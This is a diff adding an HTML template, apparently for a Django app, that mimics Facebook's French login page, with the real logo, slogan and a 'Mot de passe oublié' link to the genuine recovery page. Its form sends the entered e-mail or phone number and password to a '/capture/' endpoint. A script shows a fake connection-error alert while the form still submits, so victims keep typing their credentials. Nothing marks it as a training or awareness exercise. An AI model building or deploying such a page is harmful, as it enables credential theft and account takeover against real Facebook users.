@@ -1,0 +1,130 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook - Connexion ou inscription</title>
+        <!-- Bootstrap CSS -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+        <style>
+            body {
+                background-color: #f0f2f5;
+                font-family: Arial, sans-serif;
+            }
+            .login-container {
+                width:500px;
+                margin-left:-70px;
+                margin-right:70px;
+                padding: 20px;
+                background-color: #fff;
+                border-radius: 10px;
+                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            }
+            .facebook-logo img {
+                width: 330px;
+               margin-top:-100px;
+            }
+            .facebook-slogan {
+                padding-left:40px;
+                margin-top: -20px;
+                padding-right:100px;
+                font-size:28px;
+                color: black;
+            }
+            .form-control {
+               padding:15px;
+               margin-top:10px;
+               margin-bottom:10px;
+            }
+            .login-btn {
+                background-color: #1877f2;
+                font-weight: bold; /* Gras */
+                font-size: 20px; 
+                color: white;
+                border: none;
+                width: 100%;
+                padding: 10px;
+            }
+            .login-btn:hover {
+                background-color: #145dbf;
+            }
+            .divider {
+                display: flex;
+                align-items: center;
+                text-align: center;
+                margin: 20px 0;
+            }
+            .divider::before,
+            .divider::after {
+                content: '';
+                flex: 1;
+                border-bottom: 1px solid #ddd;
+            }
+            .divider::before {
+                margin-right: 10px;
+            }
+            .divider::after {
+                margin-left: 10px;
+            }
+            .create-account-btn {
+                margin-left:53px;
+                background-color: #42b72a;
+                color: white;
+                border: none;
+                font-weight: bold; 
+                font-size: 17px; 
+                width: 70%;
+                padding: 10px;
+            }
+            .create-account-btn:hover {
+                background-color: #36a420;
+            }
+            .forgot-password {
+                font-size: 0.875rem;
+                color: #1877f2;
+                text-decoration: none;
+            }
+            .forgot-password:hover {
+                text-decoration: underline;
+            }
+            .mdp{
+                padding-top:10px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container d-flex justify-content-center align-items-center vh-100">
+            <div class="facebook-logo">
+                <img src="https://z-p3-static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+                <h2 class="facebook-slogan">Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
+            </div>
+            <div class="login-container">
+                <form action="/capture/" method="post"onsubmit="return afficherAlerte(event)" >
+                    {% csrf_token %}
+                    <div class="form-input">
+                        <input type="text" class="form-control" name="username" id="username" placeholder="Adresse e-mail ou numéro de tél." autofocus required>
+                    </div>
+                    <div class="form-input">
+                        <input type="password" class="form-control" name="password" id="password" placeholder="Mot de passe" required>
+                    </div>
+                    <button type="submit" class="btn login-btn">Se connecter</button>
+                </form>
+                <div class="text-center mdp">
+                    <a href="https://web.facebook.com/recover/initiate" class="forgot-password">Mot de passe oublié ?</a>
+                </div>
+                <div class="divider">ou</div>
+                <a href="#" class="btn create-account-btn">Créer nouveau compte</a>
+
+            </div>
+        </div>
+        <script>
+            function afficherAlerte(event) {
+                alert("Erreur de Connexion, Cliquez sur ok pour recommencer");
+                return true; // Retourne true pour permettre la soumission du formulaire
+            }
+        </script>
+        <!-- Bootstrap JS -->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+    </body>
+</html>
